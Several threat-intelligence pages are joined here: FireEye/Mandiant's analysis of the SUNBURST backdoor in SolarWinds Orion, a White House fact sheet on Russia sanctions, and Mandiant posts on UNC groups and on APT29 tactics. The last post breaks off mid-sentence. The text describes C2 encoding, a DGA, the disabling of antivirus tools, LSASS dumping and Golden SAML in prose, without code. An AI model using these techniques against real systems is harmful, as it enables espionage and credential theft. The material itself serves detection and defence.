SolarWinds.Orion.Core.BusinessLayer.dll component. Once the update is installed, the malicious DLL will be loaded by the legitimateÂ SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration). After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will return a CNAME record that points to a Command and Control (C2) domain. The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications. The list of known malicious infrastructure is available on FireEyeâs GitHub page. FireEye has detected this activity at multiple entities worldwide. The victims have included government, consulting, technology, telecom and extractive entities in North America, Europe, Asia and the Middle East. We anticipate there are additional victims in other countries and verticals. FireEye has notified all entities we are aware of being affected. We are currently tracking the software supply chain compromise and related post intrusion activity as UNC2452. After gaining initial access, this group uses a variety of techniques to disguise their operations while they move laterally (Figure 2). This actor prefers to maintain a light malware footprint, instead preferring legitimate credentials and remote access for access into a victimâs environment. This section will detail the notable techniques and outline potential opportunities for detection. TEARDROP and BEACON Malware Used Multiple SUNBURST samples have been recovered, delivering different payloads. In at least one instance the attackers deployed a previously unseen memory-only dropper weâve dubbed TEARDROP to deploy Cobalt Strike BEACON. TEARDROP is a memory only dropper that runs as a service, spawns a thread and reads from the file âgracious_truth.jpgâ, which likely has a fake JPG header. Next it checks that HKU\SOFTWARE\Microsoft\CTF exists, decodes an embedded payload using a custom rolling XOR algorithm and manually loads into memory an embedded payload using a custom PE-like file format. TEARDROP does not have code overlap with any previously seen malware. We believe that this was used to execute a customized Cobalt Strike BEACON. Mitigation: FireEye has provided two Yara rules to detect TEARDROP available on our GitHub. Defenders should look for the following alerts from FireEye HX: MalwareGuard and WindowsDefender: Process Information file_operation_closedfile-path*: âc:\\windows\\syswow64\\netsetupsvc.dllactor-process:pid: 17900 Windowâs defender Exploit Guard log entries: (Microsoft-Windows-Security-Mitigations/KernelMode event ID 12)Â  Â  Â  Â  Â  Â  Processâ\Device\HarddiskVolume2\Windows\System32\svchost.exeâ (PID XXXXX) would have been blocked from loading the non-Microsoft-signed binaryâ\Windows\SysWOW64\NetSetupSvc.dllâ Attacker Hostnames Match Victim Environment The actor sets the hostnames on their command and control infrastructure to match a legitimate hostname found within the victimâs environment. This allows the adversary to blend into the environment, avoid suspicion, and evade detection. Detection Opportunity The attacker infrastructure leaks its configured hostname in RDP SSL certificates, which is identifiable in internet-wide scan data. This presents a detection opportunity for defenders -- querying internet-wide scan data sources for an organizationâs hostnames can uncover malicious IP addresses that may be masquerading as the organization. (Note: IP Scan history often shows IPs switching between default (WIN-*) hostnames and victimâs hostnames) Cross-referencing the list of IPs identified in internet scan data with remote access logs may identify evidence of this actor in an environment. There is likely to be a single account per IP address. IP Addresses located in Victimâs Country The attackerâs choice of IP addresses was also optimized to evade detection. The attacker primarily used only IP addresses originating from the same country as the victim, leveraging Virtual Private Servers. Detection Opportunity This also presents some detection opportunities, as geolocating IP addresses used for remote access may show an impossible rate of travel if a compromised account is being used by the legitimate user and the attacker from disparate IP addresses. The attacker used multiple IP addresses per VPS provider, so once a malicious login from an unusual ASN is identified, looking at all logins from that ASN can help detect additional malicious activity. This can be done alongside baselining and normalization of ASNâs used for legitimate remote access to help identify suspicious activity. Lateral Movement Using Different Credentials Once the attacker gained access to the network with compromised credentials, they moved laterally using multiple different credentials. The credentials used for lateral movement were always different from those used for remote access. Detection Opportunity Organizations can use HXâs LogonTracker module to graph all logon activity and analyze systems displaying a one-to-many relationship between source systems and accounts. This will uncover any single system authenticating to multiple systems with multiple accounts, a relatively uncommon occurrence during normal business operations. Temporary File Replacement and Temporary Task Modification The attacker used a temporary file replacement technique to remotely execute utilities: they replaced a legitimate utility with theirs, executed their payload, and then restored the legitimate original file. They similarly manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returning the scheduled task to its original configuration. They routinely removed their tools, including removing backdoors once legitimate remote access was achieved. Detection Opportunity Defenders can examine logs for SMB sessions that show access to legitimate directories and follow a delete-create-execute-delete-create pattern in a short amount of time. Additionally, defenders can monitor existing scheduled tasks for temporary updates, using frequency analysis to identify anomalous modification of tasks. Tasks can also be monitored to watch for legitimate Windows tasks executing new or unknown binaries. This campaignâs post compromise activity was conducted with a high regard for operational security, in many cases leveraging dedicated infrastructure per intrusion. This is some of the best operational security that FireEye has observed in a cyber attack, focusing on evasion and leveraging inherent trust. However, it can be detected through persistent defense. SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers. After an initial dormant period of up to two weeks, it retrieves and executes commands, called âJobsâ, that include the ability to transfer and execute files, profile the system, and disable system services. The backdoorâs behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files. The backdoor uses multiple blocklists to identify forensic and anti-virus tools via processes, services, and drivers. Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWindsâs website. The update package CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp (02af7cec58b9a5da1c542b5a32151ba1) contains the SolarWinds.Orion.Core.BusinessLayer.dll described in this report. After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll. This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework. Hidden in plain sight, the class SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer implements an HTTP-based backdoor. Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded. SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed. The file was signed on March 24, 2020. Initialization On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941. This hash value is calculated as the standard FNV-1A 64-bit hash with an additional XOR by 6605813339339102567 after computing the FNV-1A. This hash matches a process named ""solarwinds.businesslayerhost"". The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval. The sample continues to check this time threshold as it is run by a legitimate recurring background task. Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings. The appSettings fieldsâ keys are legitimate values that the malicious logic re-purposes as a persistent configuration. The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution. The sample checks that the machine is domain joined and retrieves the domain name before execution continues. A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid. The userID is encoded via a custom XOR scheme after the MD5 is calculated. The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value. This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags. The sample then invokes the method Update which is the core event loop of the sample. The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com. The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains. Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name. The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware. These subdomains are concatenated with one of the following to create the hostname to resolve: Process name, service name, and driver path listings are obtained, and each value is hashed via the FNV-1a + XOR algorithm as described previously and checked against hardcoded blocklists. Some of these hashes have been brute force reversed as part of this analysis, showing that these routines are scanning for analysis tools and antivirus engine components. If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes. Blocklisted services are stopped by setting their HKLM\SYSTEM\CurrentControlSet\services\<service_name>\Start registry entries to value 4 for disabled. Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated. The list of stopped services is then bit-packed into the ReportWatcherPostpone key of the appSettings entry for the samplesâ config file. If any service was transitioned to disabled the Update method exits and retries later. The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver. If any blocklisted driver is seen the Update method exits and retries. If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity. If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA. The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours). The DNS A record of generated domains is checked against a hardcoded list of IP address blocks which control the malwareâs behavior. Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution: Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching. The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command. The HTTP thread will delay for a minimum of 1 minute between callouts. The malware uses HTTP GET or HTTP POST requests. If the sample is attempting to send outbound data the content-type HTTP header will be set to ""application/octet-stream"" otherwise to ""application/json"". A JSON payload is present for all HTTP POST and PUT requests and contains the keys âuserIdâ, âsessionIdâ, and âstepsâ. The âstepsâ field contains a list of objects with the following keys: âTimestampâ, âIndexâ, âEventTypeâ, âEventNameâ, âDurationMsâ, âSucceededâ, and âMessageâ. The JSON key âEventTypeâ is hardcoded to the value âOrionâ, and the âEventNameâ is hardcoded to âEventManagerâ. Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the âMessageâ fields in the âstepsâ array. Each âMessageâ value is Base64 encoded separately. Not all objects in the âstepsâ array contribute to the malware message â the integer in the âTimestampâ field must have the 0x2 bit set to indicate that the contents of the âMessageâ field are used in the malware message. Step objects whose bit 0x2 is clear in the Timestamp field contain random data and are discarded when assembling the malware response. In observed traffic these HTTP response bodies attempt to appear like benign XML related to .NET assemblies, but command data is actually spread across the many GUID and HEX strings present. Commands are extracted from HTTP response bodies by searching for HEX strings using the following regular expression: ""\{[0-9a-f-]{36}\}""|""[0-9a-f]{32}""|""[0-9a-f]{16}"". Command data is spread across multiple strings that are disguised as GUID and HEX strings. All matched substrings in the response are filtered for non HEX characters, joined together, and HEX-decoded. The first DWORD value shows the actual size of the message, followed immediately with the message, with optional additional junk bytes following. The extracted message is single-byte XOR decoded using the first byte of the message, and this is then DEFLATE decompressed. The first character is an ASCII integer that maps to the JobEngine enum, with optional additional command arguments delimited by space characters. Commands are then dispatched to a JobExecutionEngine based upon the command value as described next. Command Value Operation Idle 0 No operation Exit 1 Terminate the current thread. SetTime 2 Sets the delay time between main event loop executions Delay is in seconds, and varies random between [.9 * <delay>, 1.1 * <delay>]. Â Â Â Â Â Â Â Â  If the delay is < 300 it is doubled on the next execution through the loop, this means it should settle onto an interval of around [5, 10] minutes. Â Â Â Â Â Â Â  There is a second, unrelated delay routine that delays for a random interval between [16hrs, 83hrs] CollectSystemDescription 3 Profile the local system including hostname, username, OS version, MAC addresses, IP address, DHCP configuration, and domain information. UploadSystemDescription 4 Perform a HTTP request to the specified URL, parse the results and compare components against unknown hashed values. Format a report and send to the C2 server. RunTask 5 Starts a new process with the given file path and arguments GetProcessByDescription 6 Returns a process listing. If no arguments are provided returns just the PID and process name. Â Â Â Â Â Â  If an argument is provided it also returns the parent PID and username and domain for the process owner. Â  KillTask 7 Terminate the given process, by PID. GetFileSystemEntries 8 Given a path and an optional match pattern recursively list files and directories WriteFile 9 Given a file path and a Base64 encoded string write the contents of the Base64 decoded string to the given file path. Write using append mode. Delay for [1s, 2s] after writing is done. FileExists 10 Tests whether the given file path exists. DeleteFile 11 Deletes the specified file path. GetFileHash 12 Compute the MD5 of a file at a given path and return result as a HEX string. If an argument is provided, it is the expected MD5 hash of the file and returns an error if the calculated MD5 differs. Â  ReadRegistryValue 13 Arbitrary registry read from one of the supported hives SetRegistryValue 14 Arbitrary registry write from one of the supported hives. DeleteRegistryValue 15 Arbitrary registry delete from one of the supported hives GetRegistrySubKeyAndValueNames Â  16 Returns listing of subkeys and value names beneath the given registry path Reboot 17 Attempts to immediately trigger a system reboot. To empower the community to detect this supply chain backdoor, we are publishing indicators and detections to help organizations identify this backdoor and this threat actor. The signatures are a mix of Yara, IOC, and Snort formats. A list of the detections and signatures are available on the FireEye GitHub repository found here. We are releasing detections and will continue to update the public repository with overlapping detections for host and network-based indicators as we develop new or refine existing ones. We have found multiple hashes with this backdoor and we will post updates of those hashes.

Applying an upgrade to an impacted box could potentially overwrite forensic evidence as well as leave any additional backdoors on the system. In addition, SolarWinds has released additional mitigation and hardening instructions here. In the event you are unable to follow SolarWindsâ recommendations, the following are immediate mitigation techniques that could be deployed as first steps to address the risk of trojanized SolarWinds software in an environment. If attacker activity is discovered in an environment, we recommend conducting a comprehensive investigation and designing and executing a remediation strategy driven by the investigative findings and details of the impacted environment.

							 The Biden administration has been clear that the United States desires a relationship with Russia that is stable and predictable. We do not think that we need to continue on a negative trajectory. However, we have also been clearâpublicly and privatelyâthat we will defend our national interests and impose costs for Russian Government actions that seek to harm us.Today the Biden administration is taking actions to impose costs on Russia for actions by its government and intelligence services against U.S. sovereignty and interests.Executive Order Targeting the Harmful Foreign Activities of the Russian GovernmentToday, President Biden signed a new sanctions executive order that provides strengthened authorities to demonstrate the Administrationâs resolve in responding to and deterring the full scope of Russiaâs harmful foreign activities. This E.O. sends a signal that the United States will impose costs in a strategic and economically impactful manner on Russia if it continues or escalates its destabilizing international actions. This includes, in particular, efforts to undermine the conduct of free and fair democratic elections and democratic institutions in the United States and its allies and partners; engage in and facilitate malicious cyber activities against the United States and its allies and partners; foster and use transnational corruption to influence foreign governments; pursue extraterritorial activities targeting dissidents or journalists; undermine security in countries and regions important to United States national security; and violate well-established principles of international law, including respect for the territorial integrity of states.  The U.S. Department of the Treasury (Treasury) carried out the following actions pursuant to the new E.O.: Imposing Additional SanctionsTreasury sanctioned 32 entities and individuals carrying out Russian government-directed attempts to influence the 2020 U.S. presidential election, and other acts of disinformation and interference.  This action seeks to disrupt the coordinated efforts of Russian officials, proxies, and intelligence agencies to delegitimize our electoral process.  The U.S. government will continue to pursue those who engage in such activity.Treasury, in partnership with the European Union, the United Kingdom, Australia, and Canada, sanctioned eight individuals and entities associated with Russiaâs ongoing occupation and repression in Crimea.  The Transatlantic community stands united in supporting Ukraine against unilateral Russian provocations along the Line of Contact in eastern Ukraine, in occupied Crimea, and along Ukraineâs borders, as well as agreeing on the need for Russia to immediately cease its military buildup and inflammatory rhetoric.           Reported Afghanistan BountiesThe Administration is responding to the reports that Russia encouraged Taliban attacks against U.S. and coalition personnel in Afghanistan based on the best assessments from the Intelligence Community (IC).  Given the sensitivity of this matter, which involves the safety and well-being of our forces, it is being handled through diplomatic, military and intelligence channels.  The safety and well-being of U.S. military personnel, and that of our allies and partners, is an absolute priority of the United States.Expelling Diplomatic PersonnelThe United States is expelling ten personnel from the Russian diplomatic mission in Washington, DC.  The personnel include representatives of Russian intelligence services.Further Responses to the SolarWinds Malicious Cyber ActivityToday the United States is formally naming the Russian Foreign Intelligence Service (SVR), also known as APT 29, Cozy Bear, and The Dukes, as the perpetrator of the broad-scope cyber espionage campaign that exploited the SolarWinds Orion platform and other information technology infrastructures. The U.S. Intelligence Community has high confidence in its assessment of attribution to the SVR.The SVRâs compromise of the SolarWinds software supply chain gave it the ability to spy on or potentially disrupt more than 16,000 computer systems worldwide. The scope of this compromise is a national security and public safety concern. Moreover, it places an undue burden on the mostly private sector victims who must bear the unusually high cost of mitigating this incident.Today, the National Security Agency, the Cybersecurity & Infrastructure Security Agency, and the Federal Bureau of Investigation are jointly issuing a cybersecurity advisory, âRussian SVR Targets U.S. and Allied Networks,â that provides specific details on software vulnerabilities that the SVR uses to gain access to victim devices and networks. The advisory also provides specific steps that network defenders can take to identify and defend against the SVRâs malicious cyber activity.Additionally, the SVRâs compromise of SolarWinds and other companies highlights the risks posed by Russiaâs efforts to target companies worldwide through supply chain exploitation. Those efforts should serve as a warning about the risks of using information and communications technology and services (ICTS) supplied by companies that operate or store user data in Russia or rely on software development or remote technical support by personnel in Russia.  The U.S. government is evaluating whether to take action under Executive Order 13873 to better protect our ICTS supply chain from further exploitation by Russia.Supporting a Global Cybersecurity ApproachThe United States continues to strongly affirm the importance of an open, interoperable, secure, and reliable Internet. Russiaâs actions run counter to that goal, which is shared by many of our allies and partners. To strengthen our collective approach to bolstering cybersecurity, we are announcing two additional steps: The United States is committed to the security of our allies and partners; these efforts are intended to reinforce again our commitment to that bedrock principle. ### We'll be in touch with the latest information on how President Biden and his administration are working for the American people, as well as ways you can get involved and help our country build back better.

Learn morearrow_forward Start for Free   Many people are hearing the term UNC for the first time after we published details of a threat group we refer to asÂ UNC2452. âUNCâ groupsâor âuncategorizedâ groupsâare raw attribution analysis that we previously kept primarily in house. We recently began rolling out UNC information toÂ Mandiant AdvantageÂ customers because we want to give users direct access to source materials and raw analysis that Mandiant experts use to write intelligence, respond to breaches, and defend our clients. In light of recent events, we want to provide some more details to the greater public on the UNC designation. AnÂ UNC group is a cluster of cyber intrusion activityâwhich includes observable artifacts such as adversary infrastructure, tools, and tradecraftâthat we are not yet ready to give a classification such as APT or FIN. UNCs are created based on a defining, anchoring characteristic often discovered during a single incident. As we discover new artifacts associated with other incidents and proactive collections efforts, the UNC provides a framework to join discrete pieces of evidence together. These clusters can grow, merge with, or break off from other clusters, potentially become combined under a TEMP name, such as TEMP.Warlock, and/or 'graduate' into fully defined groups, such as FIN11, as depicted in Figure 1. In exposing UNC groups in Mandiant Advantage, we are providing a way for users to track the groups that might become APT and FIN groupsÂ beforeÂ they 'graduate' into fully defined threat groups and are announced publicly. It is important to note that UNCs can undergo significant changes over time based on our evolving understanding of old and new evidence. UNC churn can get messy, thatâs why we consider UNCs to reflect raw to maturing stages in the attribution process. The road from an initial UNC to an APT or a FIN group typically takes years of painstaking collections, research, and analysis; thousands of pieces of evidence; hundreds of hours of work. But it is worth it! We strongly believe that attribution analysis, as it grows and matures, generates compounding returns for network defenders, equipping them to classify and prioritize response and remediation efforts, as well as predict and prevent some attacks, see Table 1. Even at early phases, UNCs can provide powerful intelligence value. Â  UNC characteristics Intelligence value Tactical Indicators such as malware, domains, IPs, CVEs exploited Block lists, detections signatures, patching priorities Operational Patterns in behavior, for example frequency of operations, commonly used tools, target locations and sectors Establish monitoring and mitigations for known TTPs, identify new infrastructure registration or other patterns attempt to predict activity Strategic Motives, goals; Potential sponsors, associates Work the threat group into organizational risk assessment. Consider which threat actors are most likely to affect my organization and why, identify worst-case scenarios from a compromise. Table 1: Intelligence value of attribution at various stages UNC1878 We first discussedÂ UNC1878 publicly in March 2020, describing how an initial TrickBot compromise fairly quickly led to the installation of an interactive backdoor and lateral movement. This incident was detected and contained before additional attacker actions were observed, but nonetheless, it fueled additional research and allowed us to link a later compromise where RYUK ransomware was deployed to the original activity set. At that time, the intelligence value was underscoring that widely distributed malware such as TrickBot can be a precursor to a ransomware infection, and the remarkable speed with which UNC1878 in particular progressed from initial foothold to lateral movementâimportant operational and strategic insights for alert prioritization and risk assessment. By late October 2020, further research into this activity set uncoveredÂ additional malware families and infrastructureÂ as well as a much more robust understanding of the groupâs most common tactics, techniques, and procedures (TTPs), including how these have both evolved over time. We were also able to identify targeting victimology patterns that allowed us to issue a warning: despite a global pandemic, UNC1878 is actively targeting healthcare facilities with ransomware. UNC1945 UNC1945Â represents a case in which we have not yet determined the goal of the attacker, nor information about its potential origin, but the tactics of this activity cluster are significant enough that it is worth calling attention to it. For example, Mandiant discovered UNC1945 exploiting a zero-day vulnerability in the Oracle Solaris Pluggable Authentication Module (PAM),Â CVE-2020-14871. We reported the vulnerability to the vendor, who recently released a patch. We observed this actor exploit various operating systems and demonstrate access to resources and numerous toolsets as well as traverse multiple third-party networks, suggesting a sophisticated and persistent adversary. We noted that UNC1945 appeared to be targeting specific financial and consulting organizations via third party compromise. These assessments allow clients to gauge potential strategic risk to their organization based on observed targeting patterns, review tactical strategies for countering third party compromise vectors, as well as download indicators and signatures to take operational defensive steps against this threat. UNC groups support Mandiant incident responders, researchers, and analysts to track malicious activity and turn observations into action to empower defenders. They also represent one way in which Mandiant Advantage is equipping clients to use source materials and raw analysis to improve tradecraft, and hopefully, defensive outcomes in their own environments. Moreover, UNC groups empower users to track activity sets that will become APT and FIN groups before they 'graduate' into fully defined threat groups and are announced publiclyâin some cases, years before.

Learn morearrow_forward Start for Free   UPDATE (May 2022):Â We have merged UNC2452 with APT29. The UNC2452 activity described in this post is now attributed to APT29. As the one-year anniversary of the discovery of the SolarWinds supply chain compromise passes, Mandiant remains committed to tracking one of the toughest actors we have encountered. These suspected Russian actors practice top-notch operational security and advanced tradecraft. However, they are fallible, and we continue to uncover their activity and learn from their mistakes. Ultimately, they remain an adaptable and evolving threat that must be closely studied by defenders seeking to stay one step ahead. Mandiant continues to track multiple clusters of suspected Russian intrusion activity that have targeted business and government entities around the globe. Based on our assessment of these activities, we have identified two distinct clusters of activity, UNC3004 and UNC2652. We associate both groups with UNC2452 also referred to as Nobelium by Microsoft. Some of the tactics Mandiant has recently observed include: In most instances, post compromise activity included theft of data relevant to Russian interests. In some instances, the data theft appears to be obtained primarily to create new routes to access other victim environments. The threat actors continue to innovate and identify new techniques and tradecraft to maintain persistent access to victim environments, hinder detection, and confuse attribution efforts. The following sections highlight intrusion activity from multiple incident response efforts that are currently tracked as multiple uncategorized clusters. Mandiant suspects the multiple clusters to be attributable to a common Russian threat. The information covers some of the tactics, techniques, and procedures (TTPs) used by the threat actors for initial compromise, establishing a foothold, data collection, and lateral movement; how the threat actors provision infrastructure; and indicators of compromise. The information is being shared to raise awareness and allow organizations to better defend themselves. Compromise of Cloud Services Providers Mandiant has identified multiple instances where the threat actor compromised service providers and used the privileged access and credentials belonging to these providers to compromise downstream customers. In at least one instance, the threat actor identified and compromised a local VPN account and made use of this VPN account to perform reconnaissance and gain further access to internal resources within the victim CSPâs environment, which ultimately led to the compromise of internal domain accounts.  Access Obtained from Info-stealer Malware Campaign Mandiant identified a campaign where the threat actors gained access to the target organizationâs Microsoft 365 environment using a stolen session token. Mandiant analyzed the workstations belonging to the end user and discovered that some systems had been infected with CRYPTBOT, an info-stealer malware, shortly before the stolen session token was generated. Mandiant observed that in some cases the user downloaded the malware after browsing to low reputation websites offering free, or âcrackedâ, software.  Mandiant assesses with moderate confidence that the threat actor obtained the session token from the operators of the info-stealer malware. These tokens were used by the actor via public VPN providers to authenticate to the targetâs Microsoft 365 environment.  Abuse of Repeated MFA Push Notifications Mandiant has also observed the threat actor executing multiple authentication attempts in short succession against accounts secured with multi-factor authentication (MFA). In these cases, the threat actor had a valid username and password combination. Many MFA providers allow for users to accept a phone app push notification or to receive a phone call and press a key as a second factor. The threat actor took advantage of this and issued multiple MFA requests to the end userâs legitimate device until the user accepted the authentication, allowing the threat actor to eventually gain access to the account. Establish Foothold In at least one case, the threat actor compromised a Microsoft Azure AD account within a Cloud Service Providerâs (CSP) tenant. The account held a specific Azure AD role that allowed it to use the Admin on Behalf Of (AOBO) feature. With AOBO, users with a specific role in the CSP tenant have Azure Role Based Access Control (RBAC) Owner access to Azure subscriptions in their customerâs tenants that were created through the reseller relationship. RBAC Owner access gives the role holder complete control over all resources within the Azure subscription. The threat actor leveraged the compromised cspâs credentials and the AOBO feature to gain privileged access to Azure subscriptions used to host and manage downstream customer systems. The actor executed commands with NT AUTHORITY\SYSTEM privileges within Azure VMs using the Azure Run Command feature. The Azure Run Command feature allows a user to run PowerShell scripts within an Azure VM using the Azure Portal, REST API, or PowerShell without knowledge of Windows credentials that are valid on the VM itself. Privilege Escalation Mandiant found evidence that the threat actor used RDP to pivot between systems that had limited internet access. The threat actor accessed numerous devices using RDP and executed several native Windows commands. On one device, the threat actors made use of the Windows Task Manager to dump the process memory belonging to LSASS. The threat actor also obtained the Azure AD Connect configuration, the associated AD service account, and the key material used to encrypt the service account credentials. The Azure AD Connect account is used to replicate the on-premise instance of Active Directory into Azure AD. In addition to this, the threat actor obtained the Active Directory Federation Services (ADFS) signing certificate and key material. This allowed the threat actor to forge a SAML token which could be used to bypass 2FA and conditional access policies to access Microsoft 365. The actor stopped Sysmon and Splunk logging on these devices and cleared Windows Event Logs. The threat actors leveraged compromised privileged accounts and used SMB, remote WMI, remote scheduled tasks registration, and PowerShell to execute commands within victim environments. The threat actor used the protocols mainly to perform reconnaissance (notably using the native command tasklist.exe to inspect remote systems), distribute BEACON around the network, as well as run native Windows commands for credential harvesting. In some cases, the actors passed in a specific Kerberos ticket during the WMIC execution using the /authority:Kerberos flag to authenticate as computer accounts. Computer accounts by design have local administrator rights over the computer for which they are named. Lateral Movement Between CSP and Downstream Clients CSPs have network filtering layers in place between their on-premises environment and downstream customer environments as an added security layer. Mandiant identified that the threat actor used the vSphere PowerCLI and custom PowerShell scripts configured to target the vCenter Web endpoint to export the virtual disk image of a specific networking device and copy it off the service providerâs infrastructure. To authenticate to vCenter the threat actor used a stolen session cookie for a Privileged Access Management (PAM) account. Mandiant believes the threat actor was able to analyze this virtual machine and identify devices within the CSPâs network that were specifically allowed to communicate with targeted downstream customers. Using this knowledge, the actor compromised the authorized source jump hosts that circumvented the network security restrictions of the service provider and downstream victim network. The actor compromised a customer administration account from one of the administration jump hosts used for customer administration within the CSPâs environment. The CSP would connect via these jump hosts using dedicated customer admin accounts to interact with a downstream customerâs infrastructure. Â The actor then performed lateral movement through RDP and the stolen target credentials towards the victim customer network. In another case, the threat actor used Azureâs built-in Run Command feature to execute commands on numerous downstream devices. The threat actor used native Windows tools to perform initial reconnaissance, credential theft and deploy Cobalt Strike BEACON to devices via PowerShell.  The actor then used this BEACON implant to persistently install CEELOADER as a Scheduled Task that ran on login as SYSTEM on specific systems. CEELOADER is downloader that decrypts a shellcode payload to execute in memory on the victim device.  Data Collection Mandiant identified multiple attempts by the threat actor to dump the Active Directory database (ntds.dit) using the built-in ntdsutil.exe command. There was also evidence that the threat actor used Sysinternals ProcDump to dump the process memory of the LSASS process. In addition to this, Mandiant discovered that the threat actor had stolen the AD FS token signing certificate and the DKM key material. This would allow the threat actor to perform Golden SAML attacks and authenticate as any user into federated environments that used AD FS for authentication, such as Microsoft 365.  The threat actors performed data theft through several PowerShell commands, uploading several sequential archive files ending with the .7z extension. The threat actor uploaded these files to a webserver they presumably controlled.  Mandiant identified binaries that were configured to upload data to the Mega cloud storage provider. The threat actor deployed the tool in the %TEMP%\d folder as mt.exe and mtt.exe. Owing to several mistakes made by the threat actor, Mandiant was able to identify that the execution of the renamed tool failed. Upon investigation, it appears that the Megatools binary used by the threat actors fails to execute if renamed. Due to this it is unclear whether the actor was able to successfully exfiltrate data to Mega using this method. Mandiant also observed the threat actor access a victimâs on-premises SharePoint server looking for sensitive technical documentation and credentials. The threat actor then used the gathered credentials to move laterally around the network.  Application Impersonation Microsoft Exchange and Exchange Online provide an impersonation role (titled ApplicationImpersonation) that grants an account the ability to access another accountâs mailbox and âact asâ that mailbox owner. Mandiant identified that the threat actor was able to authenticate to an existing account that was previously granted the ApplicationImpersonation role; it is unclear how the actor obtained this initial access.  Through this account, Mandiant witnessed the threat actor use impersonation to access multiple mailboxes belonging to users within the victim organization. The threat actor also created a new account within the Microsoft 365 environment which Mandiant deems was for backup access in the event of detection.  Residential Internet Access In some campaigns, Mandiant identified that the threat actor was using residential IP address ranges to authenticate to victim environments. Mandiant believes that this access was obtained through residential and mobile IP address proxy providers. The providers proxy traffic through actual mobile devices such as phones and tablets by legitimately bundling a proxy application in return for free applications and/or services. The actor used these services to access mailboxes in victim Microsoft 365 tenants. By doing so, the source logon IP address belongs to a major Internet Service Provider that serves customers in the same country as the victim environment. These tactics showcase the complexity of the attacker's operations and is rarely seen executed by other threat actors. Accomplishing this can make it very difficult for investigators to differentiate between normal user activity and the threat actor's activity. Geo-located Azure Infrastructure In another campaign, the threat actor provisioned a system within Microsoft Azure that was within close proximity to a legitimate Azure-hosted system belonging to the CSP that they used to access their customerâs environment. This allowed the actor to establish geo-proximity with the victims which resulted in the recorded source IP address for the activity originating from within legitimate Azure IP ranges. Similar to the technique of using residential IP addresses, using Azure infrastructure within close proximity to victim networks makes it difficult for investigators to differentiate between normal user activity and the threat actorâs activity. Compromised WordPress Sites Hosting Second Stage Payloads In several campaigns by the actor, Mandiant and our partners identified that the actor was hosting second stage payloads as encrypted blobs on legitimate websites running WordPress. Mandiant observed at least two separate malware families attributed to the threat actor hosted on compromised WordPress sites. TOR, VPS and VPN Providers In multiple campaigns by the threat actor, Mandiant witnessed the actor use a mixture of TOR, Virtual Private Servers (VPS) and public Virtual Private Networks (VPN) to access victim environments. In a particular campaign, Mandiant identified that the threat actor performed initial reconnaissance via a VPS provider located in the same region as the victim. Mandiant believes a misconfiguration by the threat actor meant that the VPN services running on the VPS stopped functioning after 8 hours. Mandiant was then able to identify numerous TOR exit nodes that the threat actor used based on new authentication events. Mandiant identified attempts to compromise multiple accounts within an environment and kept use of each account separated by function. This reduced the likelihood that detecting one activity could expose the entire scope of the intrusion. Mandiant found evidence that the actor compromised multiple accounts and used one for the sole purpose of reconnaissance, while the others were reserved for lateral movement within the organization. Mandiant previously observed this threat actor using strict operational security to use specific accounts and systems in victim environments for activities that are often higher risk, such as data theft and large-scale reconnaissance.  Once within an environment, the threat actor was able to quickly pivot to on-premises servers and crawl these servers for technical documentation and credentials. From this documentation, the actor was able to identify a route to gain access to their ultimate targetâs network. This reconnaissance shows that the threat actor had a clear end goal in mind and were able to identify and exploit an opportunity to obtain required intelligence to further their goals. Mandiant also observed efforts to avoid detection by circumventing or deleting system logging within the 